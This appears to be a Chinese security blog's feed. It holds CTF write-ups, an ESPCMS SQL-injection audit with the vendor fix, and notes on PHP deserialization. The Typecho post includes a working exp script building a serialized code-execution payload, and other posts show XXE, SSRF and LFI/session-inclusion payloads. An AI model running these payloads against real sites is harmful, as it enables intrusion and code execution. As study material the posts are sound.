class="line">!is_numeric($_REQUEST[&apos;number&apos;])</span><br><span class="line">$req[&apos;number&apos;]==strval(intval($req[&apos;number&apos;])</span><br><span class="line">!is_palindrome_number($req[&quot;number&quot;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$value1==$value2</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-简单登录题&quot;&gt;&lt;a href=&quot;#1-简单登录题&quot; class=&quot;headerlink&quot; title=&quot;1. 简单登录题&quot;&gt;&lt;/a&gt;1. 简单登录题&lt;/h2&gt;&lt;p&gt;考点：CBC翻转字节攻击+sql注入&lt;br&gt;从返回包得到tip：test.php&lt;br&gt;访问得到
      
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>ESPCMS p8前台SQL注入</title>
    <link href="http://yoursite.com/2019/09/04/ESPCMS%20p8%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2019/09/04/ESPCMS p8前台SQL注入/</id>
    <published>2019-09-04T15:54:01.000Z</published>
    <updated>2019-09-04T15:54:01.161Z</updated>
    
    <content type="html"><![CDATA[<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://gitee.com/earclink/espcms" target="_blank" rel="noopener">https://gitee.com/earclink/espcms</a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在espcms_web\Search.php中<br>第52行，Search类对用户GET方式提交的<code>attr_array</code>数据，直接进行反序列化<br>然后对反序列化的数据进行是否为数组的判断，得到<code>attr_array</code>数组<br>然后对<code>attr_array</code>数组的键值对进行遍历，在<code>db_att_where</code>字符串中直接拼接<code>key</code>的值<br>将表名和<code>db_att_where</code>传入<code>espcms_db_num</code>函数进行处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">if ($_GET[&apos;attr_array&apos;]) &#123;</span><br><span class="line">$_REQUEST[&apos;attr_array&apos;] = unserialize(stripslashes($_GET[&apos;attr_array&apos;]));</span><br><span class="line">&#125;</span><br><span class="line">$attr_array = $_REQUEST[&apos;attr_array&apos;] &amp;&amp; is_array($_REQUEST[&apos;attr_array&apos;]) ? $_REQUEST[&apos;attr_array&apos;] : array();</span><br><span class="line">if (is_array($attr_array) &amp;&amp; count($attr_array) &gt; 0) &#123;</span><br><span class="line">foreach ($attr_array as $key =&gt; $value) &#123;</span><br><span class="line">if ($value) &#123;</span><br><span class="line">$db_att_where = &quot; AND isclass=1 AND attrname=&apos;$key&apos;&quot;;</span><br><span class="line">$countnum = espcms_db_num($db_table_model_att, $db_att_where);</span><br><span class="line">if ($countnum &gt; 0) &#123;</span><br><span class="line">if (is_array($value) &amp;&amp; count($value) &gt; 0) &#123;</span><br><span class="line">$db_where_or = &apos;&apos;;</span><br><span class="line">foreach ($value as $i =&gt; $where_val) &#123;</span><br><span class="line">$where_val = check_str($where_val);</span><br><span class="line">$db_where_or .= $i &gt; 0 ? &quot; OR FIND_IN_SET(&apos;$where_val&apos;,b.$key)&quot; : &quot; FIND_IN_SET(&apos;$where_val&apos;,b.$key)&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$db_where .= &quot; AND ($db_where_or)&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$value = check_str($value);</span><br><span class="line">$db_where .= &quot; AND b.$key=&apos;$value&apos;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>在espcms_public\espcoms_db.php中<br>第221行，将<code>$db_where</code>字段与<code>&#39; WHERE 1=1&#39;</code>字符串进行拼接<br>在将where字段拼接到select字段中，传入<code>db_array_read</code>函数进行处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function espcms_db_num($tableName, $db_where = null, $num_str = &apos;*&apos;) &#123;</span><br><span class="line">global $espcms_link_db;</span><br><span class="line">if (!$tableName) &#123;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">$sql_where = &quot; WHERE 1=1&quot; . $db_where;</span><br><span class="line">$db_sql = &quot;SELECT COUNT($num_str) AS num FROM $tableName $sql_where&quot;;</span><br><span class="line">$db_read = $espcms_link_db-&gt;db_array_read($db_sql);</span><br><span class="line">return $db_read[&apos;num&apos;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在espcms_public\ESPCMS_Mysql.php中<br>第157行，<code>db_array_read</code>将数据传入第139行<code>db_query</code>执行，一路并没有做任何过滤，因而存在时间盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function db_array_read($sql) &#123;</span><br><span class="line">$query = $this-&gt;db_query($sql);</span><br><span class="line">return $this-&gt;db_array_list($query);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>至此，分析结束</p><h2 id="官方修复方案"><a href="#官方修复方案" class="headerlink" title="官方修复方案"></a>官方修复方案</h2><p>作者在新版本中针对key值进行了过滤。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (!espcms_isact($key, &quot;/^[\w]+$/i&quot;)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;下载地址&quot;&gt;&lt;a href=&quot;#下载地址&quot; class=&quot;headerlink&quot; title=&quot;下载地址&quot;&gt;&lt;/a&gt;下载地址&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://gitee.com/earclink/espcms&quot; target=&quot;_blank&quot; re
      
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>一些链接记录</title>
    <link href="http://yoursite.com/2019/09/04/%E9%93%BE%E6%8E%A5/"/>
    <id>http://yoursite.com/2019/09/04/链接/</id>
    <published>2019-09-04T13:30:46.000Z</published>
    <updated>2019-09-04T15:55:46.536Z</updated>
    
    <content type="html"><![CDATA[<p>phpStorm调试：<a href="https://www.php.cn/php-weizijiaocheng-387522.html" target="_blank" rel="noopener">https://www.php.cn/php-weizijiaocheng-387522.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;phpStorm调试：&lt;a href=&quot;https://www.php.cn/php-weizijiaocheng-387522.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.php.cn/php-weizijiaoche
      
    
    </summary>
    
      <category term="资料" scheme="http://yoursite.com/categories/%E8%B5%84%E6%96%99/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>Typecho反序列化小白笔记</title>
    <link href="http://yoursite.com/2019/09/01/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%99%BD%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2019/09/01/Typecho反序列化小白笔记/</id>
    <published>2019-09-01T12:02:09.000Z</published>
    <updated>2019-09-01T12:02:09.770Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>序列化内容：Array（Object）<br>反序列化<br>反序列化内容传入Typecho_Db的构造函数中<br>Typecho_Db构造函数将Object与字符串拼接触发<code>__toString</code>方法<br>搜寻<code>__toString</code>方法<br>在<code>Typecho_Feed</code>类中<code>__toString</code>方法第290行的私有变量调用了某个属性<code>$_items</code><br>该属性被遍历，其元素的<code>$item[&#39;author&#39;]</code>调用了某个属性<code>screenName</code><br>我们可以控制其访问不可访问属性来触发<code>__get</code>方法，因此将Object设置为<code>Typecho_feed</code><br>搜寻<code>__get</code>方法<br>找到<code>Typecho_Request</code>类，分析<code>__get</code>方法，<code>__get</code>方法调用了<code>get</code>方法<br><code>get</code>寻找<code>$_params</code>中键为<code>key</code>的值赋值为<code>value</code>，<code>key</code>值为<code>scrennName</code><br><code>get</code>方法调用<code>_applyFilter</code>方法，将<code>value</code>传递进去<br><code>_applyFilter</code>有危险方法<code>call_user_func</code>，并且两个参数可控，最后达成命令执行。<br>因此将<code>_itmes</code>的元素赋值为<code>Typecho_Request</code>，并且设置<code>default</code>为<code>phpinfo();</code>，设置<code>_filter</code>为<code>array(&#39;assert&#39;)</code></p><h2 id="payload结构："><a href="#payload结构：" class="headerlink" title="payload结构："></a>payload结构：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">(  // 实例化一个Typecho_Db， 数组必须包含 &apos;adapter&apos;和&apos;prefix&apos;两个键值</span><br><span class="line"></span><br><span class="line">    /** </span><br><span class="line">     * 实例化Typecho_Db时构造函数中进行字符串拼接，</span><br><span class="line">     * 如果值为对象，则触发该对象的 __toString()魔术方法</span><br><span class="line">     */</span><br><span class="line">    [adapter] =&gt; Typecho_Feed Object  </span><br><span class="line">      (</span><br><span class="line">        /** </span><br><span class="line">         * 在Feed的__toString()魔术方法中，</span><br><span class="line">         * 290行和358行，访问了$item[&apos;author&apos;]-&gt;screenName</span><br><span class="line">         * 程序要运行到此处$this-&gt;_type必须为 &quot;RSS 2.0&quot;或者&quot;ATOM 1.0&quot;</span><br><span class="line">         */</span><br><span class="line">        [_type:Typecho_Feed:private] =&gt; RSS 2.0  </span><br><span class="line"></span><br><span class="line">        /** </span><br><span class="line">         * 当从不可访问的属性中读取，将会触发该类的__get()魔术方法</span><br><span class="line">         */</span><br><span class="line">        [_items:Typecho_Feed:private] =&gt; Array</span><br><span class="line">          (</span><br><span class="line">            [0] =&gt; Array</span><br><span class="line">              (</span><br><span class="line">                /** </span><br><span class="line">                 * &apos;category&apos; 用于分支处理，如果不用于回显数据，此字段可以省略</span><br><span class="line">                 *  此处需要构造非空数组，且成员值为对象</span><br><span class="line">                 */</span><br><span class="line">                [category] =&gt; Array</span><br><span class="line">                  (</span><br><span class="line">                    [0] =&gt; Test Object</span><br><span class="line">                      (</span><br><span class="line">                      )</span><br><span class="line">                  )</span><br><span class="line"></span><br><span class="line">                /** </span><br><span class="line">                 *  此处构造满足触发Typecho_Request对象的__get()魔术方法</span><br><span class="line">                 */</span><br><span class="line">                [author] =&gt; Typecho_Request Object</span><br><span class="line">                  (  // 必须包含两个键值 &apos;_params&apos;和&apos;_filter&apos;</span><br><span class="line"></span><br><span class="line">                    /** </span><br><span class="line">                     * @ 此处为触发的关键部分</span><br><span class="line">                     * 1、由Feed类中访问screName触发Request的__get()，</span><br><span class="line">                     *    在Request.php的290行传入$key=&apos;screenName&apos;</span><br><span class="line">                     * 2、此时get()函数内  $value=&apos;phpinfo()&apos;    // 296-297行</span><br><span class="line">                     * 3、继续判断了  $value值非数组，且长度大于0  // 307行</span><br><span class="line">                     * 4、将 $value 传入 _applyFilter()                </span><br><span class="line">                     * 5、判断 $this-&gt;_filter                    // 161行</span><br><span class="line">                     * 6、遍历 $this-&gt;_filter                    // 162行</span><br><span class="line">                     * 7、$value非数组，执行call_user_func($filter, $value)</span><br><span class="line">                     * 8、最终执行结果为call_user_func(assert, phpinfo())</span><br><span class="line">                     */</span><br><span class="line">                    [_params:Typecho_Request:private] =&gt; Array</span><br><span class="line">                      (</span><br><span class="line">                        [screenName] =&gt; phpinfo()</span><br><span class="line">                      )</span><br><span class="line"></span><br><span class="line">                    [_filter:Typecho_Request:private] =&gt; Array</span><br><span class="line">                      (</span><br><span class="line">                        [0] =&gt; assert</span><br><span class="line">                      )</span><br><span class="line">                  )</span><br><span class="line">              )</span><br><span class="line">          )</span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">    // 分支处理</span><br><span class="line">    [prefix] =&gt; typecho_</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>没注释的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">    [adapter] =&gt; Typecho_Feed Object</span><br><span class="line">    (</span><br><span class="line">        [_type:Typecho_Feed:private] =&gt; RSS 2.0</span><br><span class="line">        [_items:Typecho_Feed:private] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; Array</span><br><span class="line">            (</span><br><span class="line">                [category] =&gt; Array</span><br><span class="line">                    (</span><br><span class="line">                        [0] =&gt; Test Object</span><br><span class="line">                            (</span><br><span class="line">                            )</span><br><span class="line">                    )</span><br><span class="line"></span><br><span class="line">                [author] =&gt; Typecho_Request Object</span><br><span class="line">                (</span><br><span class="line">                    [_params:Typecho_Request:private] =&gt; Array</span><br><span class="line">                        (</span><br><span class="line">                            [screenName] =&gt; phpinfo()</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                    [_filter:Typecho_Request:private] =&gt; Array</span><br><span class="line">                        (</span><br><span class="line">                            [0] =&gt; assert</span><br><span class="line">                        )</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">    [prefix] =&gt; typecho_</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><h2 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">$CMD = &apos;phpinfo()&apos;;</span><br><span class="line"></span><br><span class="line">class Typecho_Feed &#123;</span><br><span class="line">const RSS2 = &apos;RSS 2.0&apos;;</span><br><span class="line">const ATOM1 = &apos;ATOM 1.0&apos;;</span><br><span class="line"></span><br><span class="line">private $_type;</span><br><span class="line">private $_items;</span><br><span class="line"></span><br><span class="line">public function __construct() &#123;</span><br><span class="line">//$this-&gt;_type = $this::RSS2;</span><br><span class="line"></span><br><span class="line">$this-&gt;_type = $this::ATOM1;</span><br><span class="line">$this-&gt;_items[0] = array(</span><br><span class="line">&apos;category&apos; =&gt; array(new Typecho_Request()),</span><br><span class="line">&apos;author&apos; =&gt; new Typecho_Request(),</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Typecho_Request &#123;</span><br><span class="line">private $_params = array();</span><br><span class="line">private $_filter = array();</span><br><span class="line"></span><br><span class="line">public function __construct() &#123;</span><br><span class="line">$this-&gt;_params[&apos;screenName&apos;] = $GLOBALS[CMD];</span><br><span class="line">$this-&gt;_filter[0] = &apos;assert&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp = array(</span><br><span class="line">&apos;adapter&apos; =&gt; new Typecho_Feed(),</span><br><span class="line">&apos;prefix&apos; =&gt; &apos;typecho_&apos;,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize($exp));</span><br></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>需要GET传参finish，并且Referer字段为本站。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://www.freebuf.com/vuls/155753.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/155753.html</a></li><li><a href="https://skysec.top/2017/12/29/cms%E5%B0%8F%E7%99%BD%E5%AE%A1%E8%AE%A1-typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://skysec.top/2017/12/29/cms%E5%B0%8F%E7%99%BD%E5%AE%A1%E8%AE%A1-typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/</a></li><li><a href="https://skysec.top/2019/07/18/Summary-of-serialization-attacks-Part-3/#typecho%E5%BA%8F%E5%88%97%E5%8C%96" target="_blank" rel="noopener">https://skysec.top/2019/07/18/Summary-of-serialization-attacks-Part-3/#typecho%E5%BA%8F%E5%88%97%E5%8C%96</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;序列化内容：Array（Object）&lt;br&gt;反序列化&lt;br&gt;反序列化内容传入Typecho_Db的构造函数中&lt;br&gt;Typecho_Db构
      
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化原生类魔术方法的利用</title>
    <link href="http://yoursite.com/2019/09/01/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%94%9F%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2019/09/01/PHP反序列化原生类魔术方法的利用/</id>
    <published>2019-09-01T07:14:51.000Z</published>
    <updated>2019-09-01T07:14:51.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h2><p>方法：call<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">$target = &apos;http://127.0.0.1/flag.php&apos;;</span><br><span class="line">$a = new SoapClient(null, array(&apos;location&apos; =&gt; $target,</span><br><span class="line">&apos;user_agent&apos; =&gt; &quot;AAA:BBB\r\n&quot; .</span><br><span class="line">&quot;Cookie:PHPSESSID=2r4kt8t9l0c6hhq67e1bs4th90&quot;,</span><br><span class="line">&apos;uri&apos; =&gt; &quot;http://127.0.0.1/&quot;));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();</span><br></pre></td></tr></table></figure></p><p>通过调用SoapClient类的<code>__call</code>方法可以触发ssrf攻击。<br><img src="/img/1567317309843.png" alt=""><br>通过抓包可以看到，本地127.0.0.1对自身发起了请求，并且SoapClient可以对header部分进行修改，可以实现SSRF攻击。</p><h2 id="SQLite3"><a href="#SQLite3" class="headerlink" title="SQLite3"></a>SQLite3</h2><p>方法：construct<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sky=new SQLite3(&apos;/tmp/sky/evil.php&apos;);</span><br></pre></td></tr></table></figure></p><p>通过SQLite3的<code>__construct</code>方法可以创建任意空白文件，怎么触发<code>__construct</code>我也不太清楚。</p><h2 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h2><p>方法：toString、construct<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$dir = new DirectoryIterator(&apos;/tmp/sky/&apos;);</span><br><span class="line">foreach ($dir as $fileinfo) &#123;</span><br><span class="line">echo $fileinfo.&quot;\n&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h2><p>方法：toString、construct<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$xml = new SimpleXMLElement(&apos;&lt;!DOCTYPE ANY [&lt;!ENTITY shit SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt;&amp;shit;&lt;/root&gt;&apos;,LIBXML_NOENT);</span><br><span class="line">echo $xml;</span><br></pre></td></tr></table></figure></p><p>LIBXML_NOENT模式可以触发xml漏洞，echo可以进行回显</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>上述了多个原生类的利用点，实际上他们都来自于一场真实的案例，原文如下：<br><a href="https://5haked.blogspot.com/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html" target="_blank" rel="noopener">https://5haked.blogspot.com/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html</a><br>该牛串联多个原生类序列化问题，最后成功对某知名网站的任意代码执行，有兴趣的可以好好拜读一下~</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://skysec.top/2019/05/05/Summary-of-serialization-attacks-Part-2/#SimpleXMLElement" target="_blank" rel="noopener">https://skysec.top/2019/05/05/Summary-of-serialization-attacks-Part-2/#SimpleXMLElement</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SoapClient&quot;&gt;&lt;a href=&quot;#SoapClient&quot; class=&quot;headerlink&quot; title=&quot;SoapClient&quot;&gt;&lt;/a&gt;SoapClient&lt;/h2&gt;&lt;p&gt;方法：call&lt;br&gt;&lt;figure class=&quot;highlight pl
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>2018-Xctf Final &amp; bestphp-revenge</title>
    <link href="http://yoursite.com/2019/08/31/2018-Xctf%20Final%20&amp;%20bestphp-revenge/"/>
    <id>http://yoursite.com/2019/08/31/2018-Xctf Final &amp; bestphp-revenge/</id>
    <published>2019-08-31T13:49:49.000Z</published>
    <updated>2019-08-31T13:49:49.341Z</updated>
    
    <content type="html"><![CDATA[<h2 id="bestphp"><a href="#bestphp" class="headerlink" title="bestphp"></a>bestphp</h2><p>考点：变量覆盖+lfi+session文件转移<br>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&apos;open_basedir&apos;, &apos;C:/www/t/830&apos;);</span><br><span class="line">$file = &apos;function.php&apos;;</span><br><span class="line">$func = isset($_GET[&apos;function&apos;]) ? $_GET[&apos;function&apos;] : &apos;filters&apos;;</span><br><span class="line">call_user_func($func, $_GET);</span><br><span class="line">include $file;</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&apos;name&apos;] = $_POST[&apos;name&apos;];</span><br><span class="line">if ($_SESSION[&apos;name&apos;] == &apos;admin&apos;) &#123;</span><br><span class="line">header(&apos;location:admin.php&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>关键代码在<code>call_user_func</code>，第二个参数为<code>$_GET</code>数组，我们无法控制<code>$_GET</code>整个的值，但是能控制其键和名，可以想到使用变量覆盖<code>extract</code>函数覆盖file值，进行文件包含。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?function=extract&amp;file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p><p>可以看到function.php和admin.php源码，但用处不大</p><p>open_basedir被限制了，可以通过<code>session_start</code>的参数选项进行修改session文件存储位置<br><img src="/img/1567235922169.png" alt="">，同样配置参数的第二个选项也是使用数组，因此也能配置。<br>但是options方式只有在php7.0以上才支持。</p><p>因此我们的思路：先通过session_start修改session文件位置，通过POST传递name控制SESSION文件内容，利用extract控制file变量进行文件包含。<br>第一步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?function=session_start&amp;save_path=C:\www\t\830</span><br><span class="line">name=&lt;?=phpinfo();?&gt;</span><br></pre></td></tr></table></figure></p><p>第二步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?function=extract&amp;file=C:\www\t\830\sess_7c2nmq4a93e9k3adi32b647a31</span><br></pre></td></tr></table></figure></p><p><img src="/img/1567237317824.png" alt=""></p><h2 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h2><p>考点：soap ssrf+session 反序列化+变量覆盖+session_start小技巧<br>环境搭建了一天还是没搞好，还是记录一下<br>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$b = &apos;implode&apos;;</span><br><span class="line">call_user_func($_GET[f],$_POST);</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_GET[name]))&#123;</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);</span><br><span class="line">call_user_func($b,$a);</span><br></pre></td></tr></table></figure></p><p>flag.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 